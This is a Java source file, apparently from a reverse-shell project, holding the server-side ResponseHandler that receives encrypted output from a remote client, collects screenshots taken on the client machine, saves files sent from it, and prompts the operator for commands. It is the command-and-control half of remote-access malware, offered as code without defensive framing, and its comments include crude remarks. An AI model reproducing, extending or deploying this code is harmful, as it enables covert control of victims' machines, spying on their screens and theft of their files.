package obs1d1anc1ph3r.reverseshell.server;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.server.encryption.ChaCha20;

public class ResponseHandler implements Runnable {

	private final DataInputStream dataIn;
	private final DataOutputStream dataOut;
	private final Socket clientSocket;
	private final ReceiveScreenShot screenshotHandler;
	private final FileSaver fileSaver;
	private final byte[] encryptionKey;

	//This class should probably be refactored and do a bit less
	//ToDo -- Refactor the class by creating a plugin manager for the server side, basically do the same thing as you did with the client
	public ResponseHandler(DataInputStream dataIn, DataOutputStream dataOut, Socket clientSocket, byte[] encryptionKey, byte[] nonce) {
		this.dataIn = dataIn;
		this.dataOut = dataOut;
		this.clientSocket = clientSocket;
		this.screenshotHandler = new ReceiveScreenShot();
		this.fileSaver = new FileSaver();
		this.encryptionKey = encryptionKey;

	}

	@Override
	public void run() {
		try {
			while (true) {
				int length = dataIn.readInt(); //Get the packet length
				if (length <= 12) {
					System.err.println("[ERROR] Invalid packet length: " + length); //Fuck your packet length
					break;
				}
				byte[] receivedNonce = new byte[12]; //Stupid hat
				dataIn.readFully(receivedNonce); //I just searched it up, I was thinking of dunce, nonce is a pedofile, I was wayyyyyy off

				byte[] encryptedData = new byte[length - 12];
				dataIn.readFully(encryptedData); //Read the data

				byte[] decryptedData = ChaCha20.decrypt(encryptionKey, receivedNonce, encryptedData); //Decrypt the data
				String response = new String(decryptedData); //Get the response from the decrypted data

				if (response.equalsIgnoreCase("screenshot")) { //I should really make these plugin based like the client, that's the best way to refactor this class, I'll do that later
					handleScreenshot();
				} else if (response.equalsIgnoreCase("file download")) { //Same thing as the above comment
					handleFileDownload();
				} else {
					processResponse(response); //Normal responses
				}
			}
		} catch (IOException e) {
			if (e instanceof java.net.SocketException) {
				System.err.println("[ERROR] Connection closed by client: " + e.getMessage());
			} else {
				System.err.println("[ERROR] Error reading response: " + e.getMessage());
			}
		} catch (Exception ex) {
			Logger.getLogger(ResponseHandler.class.getName()).log(Level.SEVERE, null, ex);
		} finally {
			closeResources();
			System.out.println("[*] ResponseHandler thread exiting.");
		}
	}

	private void handleScreenshot() { //Refactor
    try {
        int length = dataIn.readInt();
        if (length <= 12) {
            System.err.println("[ERROR] Invalid screenshot data length.");
            return;
        }

        byte[] receivedNonce = new byte[12];
        dataIn.readFully(receivedNonce);

        byte[] encryptedImageBytes = new byte[length - 12];
        dataIn.readFully(encryptedImageBytes);

        byte[] imageBytes = ChaCha20.decrypt(encryptionKey, receivedNonce, encryptedImageBytes);

        screenshotHandler.receiveScreenshotData(imageBytes);
    } catch (IOException e) {
        System.err.println("[ERROR] Error while receiving screenshot data: " + e.getMessage());
    } catch (Exception ex) {
        Logger.getLogger(ResponseHandler.class.getName()).log(Level.SEVERE, null, ex);
    }
}


	private void handleFileDownload() { //Refactor
		try {
			String fileName = dataIn.readUTF();
			int nonceLength = dataIn.readInt();

			if (nonceLength <= 0 || nonceLength > 32) {
				throw new IOException("Invalid nonce length: " + nonceLength);
			}
			byte[] receivedNonce = new byte[nonceLength];
			dataIn.readFully(receivedNonce);

			int fileLength = dataIn.readInt();
			if (fileLength <= 0) {
				throw new IOException("Invalid file length received: " + fileLength);
			}

			byte[] encryptedFileBytes = new byte[fileLength];
			dataIn.readFully(encryptedFileBytes);

			byte[] fileBytes = ChaCha20.decrypt(encryptionKey, receivedNonce, encryptedFileBytes);

			fileSaver.saveFile(fileBytes, clientSocket, fileName);
		} catch (IOException e) {
			System.err.println("[ERROR] File transfer failed: " + e.getMessage());
		} catch (Exception ex) {
			Logger.getLogger(ResponseHandler.class.getName()).log(Level.SEVERE, null, ex);
		}
	}

	private void processResponse(String response) { //Normal thing
		String[] lines = response.split("\\R");
		for (String line : lines) {
			System.out.println(line);
		}
		System.out.print("[-] Command> "); //I'm dumb and couldn't figure this out, so I put it here
	}

	private void closeResources() {
		try {
			if (dataIn != null) {
				dataIn.close();
			}
			if (dataOut != null) {
				dataOut.close();
			}
			if (clientSocket != null && !clientSocket.isClosed()) {
				clientSocket.close();
			}
		} catch (IOException e) {
			System.err.println("[ERROR] Error closing resources: " + e.getMessage());
		}
	}
}
